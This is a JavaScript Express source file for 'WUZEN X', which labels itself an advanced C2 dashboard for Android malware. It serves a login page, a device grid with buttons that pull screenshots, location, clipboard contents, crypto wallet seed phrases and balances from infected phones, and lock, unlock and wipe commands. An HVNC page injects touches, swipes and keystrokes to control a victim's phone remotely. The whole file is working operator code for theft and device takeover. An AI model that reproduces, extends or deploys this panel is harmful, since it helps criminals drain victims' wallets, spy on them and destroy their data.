import { config } from './config.js';
import jwt from 'jsonwebtoken';

// Simple JWT auth middleware
function auth(req, res, next) {
  const token = req.cookies?.token || req.headers.authorization?.split(' ')[1];
  if (!token) return res.redirect('/dashboard/login');
  try {
    jwt.verify(token, config.jwtSecret);
    next();
  } catch {
    res.redirect('/dashboard/login');
  }
}

export function setupDashboard(app, c2) {
  
  // ===== LOGIN PAGE =====
  app.get('/dashboard/login', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>WUZEN X — Login</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;background:#0a0a12;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden}
.bg{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;background:radial-gradient(ellipse at 20% 50%,rgba(0,100,255,.08) 0%,transparent 50%),radial-gradient(ellipse at 80% 50%,rgba(100,0,255,.08) 0%,transparent 50%)}
.particles{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0;overflow:hidden}
.p{position:absolute;width:2px;height:2px;background:rgba(0,150,255,.3);border-radius:50%;animation:float linear infinite}
@keyframes float{0%{transform:translateY(100vh) scale(0);opacity:0}10%{opacity:1}90%{opacity:1}100%{transform:translateY(-10vh) scale(1);opacity:0}}
.login-card{position:relative;z-index:1;background:rgba(18,18,30,.85);border:1px solid rgba(0,150,255,.15);border-radius:20px;padding:40px;width:400px;max-width:90vw;backdrop-filter:blur(20px)}
.logo{text-align:center;margin-bottom:30px}
.logo .icon{font-size:48px;display:block;margin-bottom:5px}
.logo h1{font-size:28px;font-weight:800;background:linear-gradient(135deg,#0ff,#06f);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.logo p{font-size:12px;color:#666;margin-top:4px;letter-spacing:2px}
.form-group{margin-bottom:20px}
.form-group label{display:block;font-size:12px;color:#888;margin-bottom:6px;letter-spacing:.5px}
.form-group input{width:100%;padding:12px 16px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:10px;color:#fff;font-size:14px;transition:all .3s;outline:none}
.form-group input:focus{border-color:rgba(0,150,255,.5);box-shadow:0 0 20px rgba(0,150,255,.1)}
.form-group input::placeholder{color:#444}
.btn-login{width:100%;padding:12px;background:linear-gradient(135deg,#0ff,#06f);border:none;border-radius:10px;color:#000;font-size:15px;font-weight:700;cursor:pointer;transition:all .3s;margin-top:10px}
.btn-login:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(0,150,255,.3)}
.btn-login:disabled{opacity:.5;cursor:not-allowed}
.error{color:#f44;font-size:12px;text-align:center;margin-top:12px;display:none}
.footer{text-align:center;margin-top:24px;font-size:11px;color:#444}
</style>
</head>
<body>
<div class="bg"></div>
<div class="particles"></div>
<div class="login-card">
<div class="logo">
<span class="icon">⬡</span>
<h1>WUZEN X</h1>
<p>ADVANCED C2 DASHBOARD</p>
</div>
<form id="loginForm">
<div class="form-group">
<label>USERNAME</label>
<input type="text" id="user" placeholder="Enter username" value="${config.dashboardUser}" autocomplete="off">
</div>
<div class="form-group">
<label>PASSWORD</label>
<input type="password" id="pass" placeholder="Enter password" autocomplete="off">
</div>
<button type="submit" class="btn-login" id="loginBtn">SIGN IN →</button>
<div class="error" id="errorMsg">Invalid credentials</div>
</form>
<div class="footer">WUZEN X v2.0 • Authorized Access Only</div>
</div>
<script>
for(let i=0;i<50;i++){const p=document.createElement('div');p.className='p';p.style.left=Math.random()*100+'%';p.style.animationDuration=(5+Math.random()*10)+'s';p.style.animationDelay=Math.random()*10+'s';document.querySelector('.particles').appendChild(p)}
document.getElementById('loginForm').addEventListener('submit',async(e)=>{
e.preventDefault();const btn=document.getElementById('loginBtn');btn.disabled=true;btn.textContent='AUTHENTICATING...';
const r=await fetch('/api/auth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:document.getElementById('user').value,pass:document.getElementById('pass').value})});
if(r.ok){window.location.href='/dashboard'}else{document.getElementById('errorMsg').style.display='block';btn.disabled=false;btn.textContent='SIGN IN →'}
});
</script>
</body>
</html>`);
  });

  // ===== AUTH API =====
  app.post('/api/auth', (req, res) => {
    const { user, pass } = req.body;
    if (user === config.dashboardUser && pass === config.dashboardPass) {
      const token = jwt.sign({ user, time: Date.now() }, config.jwtSecret, { expiresIn: '24h' });
      res.cookie('token', token, { httpOnly: true, maxAge: 86400000, sameSite: 'strict' });
      return res.json({ ok: true });
    }
    res.status(401).json({ error: 'Invalid credentials' });
  });

  // ===== API: get devices =====
  app.get('/api/devices', (req, res) => {
    const devs = c2.getDevices();
    res.json({ devices: devs, online: c2.getOnlineCount(), total: c2.getTotalCount() });
  });

  // ===== API: send command =====
  app.post('/api/command', (req, res) => {
    const { deviceId, type, data } = req.body;
    if (!deviceId || !type) return res.status(400).json({ error: 'Missing deviceId or type' });
    const cmd = data !== undefined ? { type, data } : { type };
    c2.sendCommand(deviceId, cmd);
    res.json({ ok: true });
  });

  // ===== DASHBOARD MAIN PAGE =====
  app.get('/dashboard', (req, res) => {
    // Simple cookie check (no redirect for API simplicity)
    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>WUZEN X — Dashboard</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;background:#0a0a12;color:#fff;overflow-x:hidden}
.sidebar{position:fixed;left:0;top:0;width:240px;height:100vh;background:rgba(18,18,30,.95);border-right:1px solid rgba(255,255,255,.05);padding:20px;z-index:100;transform:translateX(0);transition:transform .3s}
.sidebar .logo{font-size:22px;font-weight:800;margin-bottom:30px;display:flex;align-items:center;gap:10px}
.sidebar .logo span{background:linear-gradient(135deg,#0ff,#06f);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.sidebar .logo .badge{background:#0f0;color:#000;font-size:10px;padding:2px 6px;border-radius:4px;-webkit-text-fill-color:#000}
.sidebar .nav-item{display:flex;align-items:center;gap:10px;padding:10px 12px;border-radius:8px;margin-bottom:4px;cursor:pointer;transition:all .2s;color:#888;font-size:13px;text-decoration:none}
.sidebar .nav-item:hover{background:rgba(0,150,255,.1);color:#fff}
.sidebar .nav-item.active{background:rgba(0,150,255,.15);color:#0ff}
.sidebar .divider{height:1px;background:rgba(255,255,255,.05);margin:12px 0}
.main{margin-left:240px;padding:24px;min-height:100vh}
.header{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px}
.header h1{font-size:24px;font-weight:700}
.header .stats{display:flex;gap:16px}
.header .stat{background:rgba(18,18,30,.8);border:1px solid rgba(255,255,255,.05);border-radius:10px;padding:10px 16px;text-align:center;min-width:100px}
.header .stat .num{font-size:22px;font-weight:700;color:#0ff}
.header .stat .label{font-size:10px;color:#666;text-transform:uppercase;letter-spacing:1px;margin-top:2px}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px;margin-bottom:24px}
.card{background:rgba(18,18,30,.8);border:1px solid rgba(255,255,255,.05);border-radius:12px;padding:16px;transition:all .3s}
.card:hover{border-color:rgba(0,150,255,.2);transform:translateY(-2px)}
.card .top{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
.card .status{width:8px;height:8px;border-radius:50%;display:inline-block}
.card .status.online{background:#0f0;box-shadow:0 0 8px #0f0}
.card .status.offline{background:#f44}
.card .name{font-size:14px;font-weight:600}
.card .detail{font-size:11px;color:#666;margin-top:4px}
.card .detail span{margin-right:12px}
.card .actions{display:flex;gap:6px;margin-top:10px;flex-wrap:wrap}
.card .actions button{padding:4px 10px;border-radius:5px;border:1px solid rgba(255,255,255,.1);background:transparent;color:#888;font-size:10px;cursor:pointer;transition:all .2s;font-family:'Inter',sans-serif}
.card .actions button:hover{background:rgba(0,150,255,.15);border-color:rgba(0,150,255,.3);color:#0ff}
.card .actions button.danger:hover{background:rgba(255,0,0,.15);border-color:rgba(255,0,0,.3);color:#f44}
.menu-toggle{display:none;background:none;border:none;color:#fff;font-size:24px;cursor:pointer;padding:8px}
.hvnc-panel{background:rgba(18,18,30,.8);border:1px solid rgba(255,255,255,.05);border-radius:12px;padding:16px;margin-bottom:24px}
.hvnc-panel h2{font-size:16px;margin-bottom:12px;color:#0ff}
.hvnc-panel select,.hvnc-panel input{padding:8px 12px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:6px;color:#fff;font-size:12px;margin-right:8px;font-family:'Inter',sans-serif}
.hvnc-panel button{padding:8px 16px;background:linear-gradient(135deg,#0ff,#06f);border:none;border-radius:6px;color:#000;font-weight:600;font-size:12px;cursor:pointer;font-family:'Inter',sans-serif}
@media(max-width:768px){
.sidebar{transform:translateX(-100%)}
.sidebar.open{transform:translateX(0)}
.main{margin-left:0;padding:16px}
.header{flex-direction:column;align-items:flex-start;gap:12px}
.header .stats{width:100%;justify-content:space-around}
.menu-toggle{display:block;position:fixed;top:12px;left:12px;z-index:200;background:rgba(18,18,30,.9);border-radius:8px}
}
</style>
</head>
<body>
<div class="menu-toggle" onclick="document.querySelector('.sidebar').classList.toggle('open')">☰</div>
<div class="sidebar">
<div class="logo">⬡ <span>WUZEN X</span> <span class="badge">v2</span></div>
<a class="nav-item active" href="/dashboard">📊 Dashboard</a>
<a class="nav-item" href="/dashboard/devices">📱 Devices</a>
<a class="nav-item" href="#" onclick="showHvncPanel()">🎥 HVNC</a>
<div class="divider"></div>
<a class="nav-item" href="/dashboard/toolkit">🔧 Toolkit</a>
<a class="nav-item" href="/dashboard/logs">📝 Logs</a>
<a class="nav-item" href="/dashboard/settings">⚙️ Settings</a>
<div class="divider"></div>
<a class="nav-item" href="/dashboard/login" onclick="document.cookie='token=;max-age=0'">🚪 Logout</a>
</div>
<div class="main">
<div class="header">
<h1>📊 Dashboard</h1>
<div class="stats">
<div class="stat"><div class="num" id="onlineCount">0</div><div class="label">Online</div></div>
<div class="stat"><div class="num" id="totalCount">0</div><div class="label">Total</div></div>
<div class="stat"><div class="num" id="modelCount">0</div><div class="label">Models</div></div>
</div>
</div>
<div id="hvncPanel" class="hvnc-panel" style="display:none">
<h2>🎥 HVNC Control</h2>
<select id="hvncDevice"><option>Select device...</option></select>
<button onclick="startHvnc()">▶ Start HVNC</button>
<button onclick="stopHvnc()">⏹ Stop HVNC</button>
<div id="hvncFrame" style="margin-top:12px;background:#000;border-radius:8px;min-height:200px;display:flex;align-items:center;justify-content:center;color:#444;font-size:12px">HVNC frame will appear here</div>
</div>
<div class="grid" id="deviceGrid"></div>
</div>
<script>
let ws,selectedDevice,hvncActive=false;
function connectWs(){ws=new WebSocket((location.protocol==='https:'?'wss://':'ws://')+location.host+'/ws');ws.onopen=()=>console.log('WS connected');ws.onmessage=e=>{try{const m=JSON.parse(e.data);if(m.type==='frame'&&hvncActive){document.getElementById('hvncFrame').innerHTML='<img src="data:image/png;base64,'+m.data+'" style="width:100%;border-radius:8px"/>'}}catch{}};ws.onclose=()=>setTimeout(connectWs,3000)}
connectWs();
async function refresh(){
const r=await fetch('/api/devices');const d=await r.json();
document.getElementById('onlineCount').textContent=d.online;
document.getElementById('totalCount').textContent=d.total;
document.getElementById('modelCount').textContent=new Set(d.devices.map(x=>x.info?.model)).size;
const grid=document.getElementById('deviceGrid');grid.innerHTML='';
const sel=document.getElementById('hvncDevice');sel.innerHTML='<option>Select device...</option>';
d.devices.forEach(dev=>{
const card=document.createElement('div');card.className='card';
card.innerHTML='<div class="top"><span class="name">'+dev.info?.model||dev.id.slice(0,10)+'</span><span class="status '+(dev.online?'online':'offline')+'"></span></div>'+
'<div class="detail"><span>📱 '+dev.id.slice(0,10)+'...</span><span>🔋 '+(dev.info?.battery||'?')+'%</span><span>🤖 '+(dev.info?.android||'?')+'</span></div>'+
'<div class="actions">'+
'<button onclick="sendCmd(\''+dev.id+'\',\'info\')">📋 Info</button>'+
'<button onclick="sendCmd(\''+dev.id+'\',\'screenshot\')">📸 SS</button>'+
'<button onclick="sendCmd(\''+dev.id+'\',\'location\')">📍 Loc</button>'+
'<button onclick="sendCmd(\''+dev.id+'\',\'clipboard\')">📋 Clip</button>'+
'<button onclick="sendCmd(\''+dev.id+'\',\'seed\')">🌱 Seed</button>'+
'<button onclick="sendCmd(\''+dev.id+'\',\'balance\')">💰 Bal</button>'+
'<button onclick="sendCmd(\''+dev.id+'\',\'unlock\')">🔓 Unlock</button>'+
'<button onclick="sendCmd(\''+dev.id+'\',\'lock\')">🔒 Lock</button>'+
'<button class="danger" onclick="sendCmd(\''+dev.id+'\',\'wipe\')">💣 Wipe</button>'+
'</div>';
grid.appendChild(card);
const opt=document.createElement('option');opt.value=dev.id;opt.textContent=(dev.info?.model||'Unknown')+' ('+dev.id.slice(0,8)+'...)';sel.appendChild(opt);
});
}
async function sendCmd(id,type){await fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({deviceId:id,type})})}
function showHvncPanel(){document.getElementById('hvncPanel').style.display='block';document.getElementById('hvncPanel').scrollIntoView({behavior:'smooth'})}
async function startHvnc(){const id=document.getElementById('hvncDevice').value;if(!id||id==='Select device...')return;selectedDevice=id;hvncActive=true;
document.getElementById('hvncFrame').innerHTML='<div style="color:#0ff">Starting HVNC...</div>';
ws.send(JSON.stringify({type:'hvnc_auth',deviceId:id,session:'${config.sessionSecret}'}));
await sendCmd(id,'hvnc_start');setTimeout(()=>sendCmd(id,'screenshot'),500)}
function stopHvnc(){hvncActive=false;document.getElementById('hvncFrame').innerHTML='<div style="color:#444">HVNC stopped</div>'}
refresh();setInterval(refresh,5000);
</script>
</body>
</html>`);
  });

  // ===== HVNC PAGE =====
  app.get('/hvnc/:deviceId', (req, res) => {
    const { deviceId } = req.params;
    const device = c2.getDevice(deviceId);
    if (!device) {
      return res.status(404).send(`<html><body style="background:#0a0a0a;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh"><div style="text-align:center"><h1>❌ Device Not Found</h1><p style="color:#666;margin-top:8px">Device may be offline or never connected</p></div></body></html>`);
    }

    res.send(`<!DOCTYPE html>
<html>
<head>
<title>WUZEN X — HVNC</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{background:#0a0a12;color:#fff;font-family:'Inter','Segoe UI',sans-serif;height:100%;overflow:hidden}
#toolbar{background:rgba(18,18,30,.95);padding:8px 16px;display:flex;align-items:center;gap:8px;border-bottom:1px solid rgba(0,255,255,.1);height:48px;backdrop-filter:blur(10px)}
#toolbar .logo{font-weight:800;font-size:14px;background:linear-gradient(135deg,#0ff,#06f);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-right:8px}
#toolbar .device-name{font-size:12px;color:#888}
#toolbar button{background:rgba(0,150,255,.1);border:1px solid rgba(0,150,255,.2);color:#0ff;padding:4px 10px;border-radius:5px;cursor:pointer;font-size:11px;transition:all .2s;font-family:'Inter',sans-serif}
#toolbar button:hover{background:rgba(0,150,255,.2)}
#toolbar button.danger{color:#f44;border-color:rgba(255,0,0,.2);background:rgba(255,0,0,.1)}
#toolbar button.danger:hover{background:rgba(255,0,0,.2)}
#status{font-size:10px;color:#666;margin-left:auto;display:flex;align-items:center;gap:4px}
#status .dot{width:6px;height:6px;border-radius:50%;display:inline-block}
#status .dot.green{background:#0f0;box-shadow:0 0 6px #0f0}
#status .dot.red{background:#f44}
#container{position:relative;flex:1;height:calc(100vh - 48px);background:#000;display:flex;align-items:center;justify-content:center;overflow:hidden}
#canvas{position:absolute;top:0;left:0;width:100%;height:100%;object-fit:contain;cursor:crosshair;background:#000}
#overlay{position:absolute;top:0;left:0;width:100%;height:100%;cursor:crosshair;z-index:10;touch-action:none}
#fps{position:absolute;top:10px;right:10px;color:#0ff;font-size:10px;font-family:monospace;z-index:20;background:rgba(0,0,0,.7);padding:2px 8px;border-radius:4px;border:1px solid rgba(0,255,255,.1)}
#toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%);background:rgba(18,18,30,.95);color:#0ff;padding:8px 20px;border-radius:8px;font-size:12px;display:none;border:1px solid rgba(0,255,255,.2);z-index:100;backdrop-filter:blur(10px)}
#latency{position:absolute;bottom:10px;right:10px;color:#0ff;font-size:10px;font-family:monospace;z-index:20;background:rgba(0,0,0,.7);padding:2px 8px;border-radius:4px}
</style>
</head>
<body>
<div id="toolbar">
<span class="logo">⬡</span>
<span class="device-name">${device.info?.model || 'Unknown'}</span>
<button onclick="send('home')">🏠 Home</button>
<button onclick="send('back')">🔙 Back</button>
<button onclick="send('recents')">📋 Recent</button>
<button onclick="send('lock')">🔒 Lock</button>
<button onclick="send('notifications')">🔔 Notif</button>
<button onclick="send('quick_settings')">⚡ QS</button>
<button class="danger" onclick="send('kill')">✖ Kill</button>
<span id="status"><span class="dot green"></span> Connected</span>
</div>
<div id="container">
<img id="canvas" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==">
<div id="overlay"></div>
<div id="fps">0 FPS</div>
<div id="latency">0 ms</div>
</div>
<div id="toast"></div>
<script>
const deviceId=${JSON.stringify(deviceId)};
const wsUrl=(location.protocol==='https:'?'wss://':'ws://')+location.host+'/ws';
const session=${JSON.stringify(config.sessionSecret)};
let ws,connected=false,frames=0,lastFps=Date.now(),lastFrameTime=0,frameCount=0,autoRefresh=true;

function toast(msg){const t=document.getElementById('toast');t.textContent=msg;t.style.display='block';setTimeout(()=>t.style.display='none',2000)}

function connect(){
 ws=new WebSocket(wsUrl);
 ws.onopen=()=>{connected=true;
  document.getElementById('status').innerHTML='<span class="dot green"></span> Connected';
  ws.send(JSON.stringify({type:'hvnc_auth',deviceId,session}));
  toast('HVNC Connected');
  setTimeout(()=>{if(autoRefresh)send('screenshot')},300);
  if(autoRefresh)setInterval(()=>send('screenshot'),500);
 };
 ws.onmessage=e=>{
  try{
   const m=JSON.parse(e.data);
   if(m.type==='frame'&&m.data){
    const now=Date.now();
    if(lastFrameTime){document.getElementById('latency').textContent=(now-m.ts||0)+' ms'}
    lastFrameTime=now;
    document.getElementById('canvas').src='data:image/png;base64,'+m.data;
    frames++;frameCount++;
    if(now-lastFps>1000){document.getElementById('fps').textContent=frames+' FPS';frames=0;lastFps=now}
   }
  }catch{}
 };
 ws.onclose=()=>{connected=false;document.getElementById('status').innerHTML='<span class="dot red"></span> Disconnected';toast('Disconnected - reconnecting...');setTimeout(connect,1500)};
 ws.onerror=()=>{}
}

function send(action,extra){
 if(!ws||ws.readyState!==1)return;
 if(action==='screenshot'&&!autoRefresh)return;
 ws.send(JSON.stringify({type:'hvnc_cmd',deviceId,action,...(extra||{})}));
}

const overlay=document.getElementById('overlay');
overlay.addEventListener('click',e=>{
 const r=overlay.getBoundingClientRect();
 const x=((e.clientX-r.left)/r.width*100).toFixed(2);
 const y=((e.clientY-r.top)/r.height*100).toFixed(2);
 send('touch',{x:parseFloat(x),y:parseFloat(y)});
});
let drag=null;
overlay.addEventListener('mousedown',e=>{drag={x:e.clientX,y:e.clientY}});
overlay.addEventListener('mouseup',e=>{
 if(!drag)return;
 const dx=e.clientX-drag.x,dy=e.clientY-drag.y;
 if(Math.abs(dx)>20||Math.abs(dy)>20){
  const r=overlay.getBoundingClientRect();
  send('swipe',{x1:((drag.x-r.left)/r.width*100).toFixed(2),y1:((drag.y-r.top)/r.height*100).toFixed(2),x2:((e.clientX-r.left)/r.width*100).toFixed(2),y2:((e.clientY-r.top)/r.height*100).toFixed(2)});
 }
 drag=null;
});
// Touch support
overlay.addEventListener('touchstart',e=>{const t=e.touches[0];drag={x:t.clientX,y:t.clientY}},{passive:true});
overlay.addEventListener('touchend',e=>{
 if(!drag)return;
 const t=e.changedTouches[0];const r=overlay.getBoundingClientRect();
 const dx=t.clientX-drag.x,dy=t.clientY-drag.y;
 if(Math.abs(dx)>20||Math.abs(dy)>20){
  send('swipe',{x1:((drag.x-r.left)/r.width*100).toFixed(2),y1:((drag.y-r.top)/r.height*100).toFixed(2),x2:((t.clientX-r.left)/r.width*100).toFixed(2),y2:((t.clientY-r.top)/r.height*100).toFixed(2)});
 }else{const x=((t.clientX-r.left)/r.width*100).toFixed(2);const y=((t.clientY-r.top)/r.height*100).toFixed(2);send('touch',{x:parseFloat(x),y:parseFloat(y)})}
 drag=null;
},{passive:true});
document.addEventListener('keydown',e=>{
 if(e.ctrlKey||e.metaKey)return;
 if(e.key==='Backspace')send('backspace');
 else if(e.key==='Enter')send('enter');
 else if(e.key==='Escape')send('home');
 else if(e.key.length===1)send('text',{text:e.key});
});
connect();
</script>
</body></html>`);
  });
}
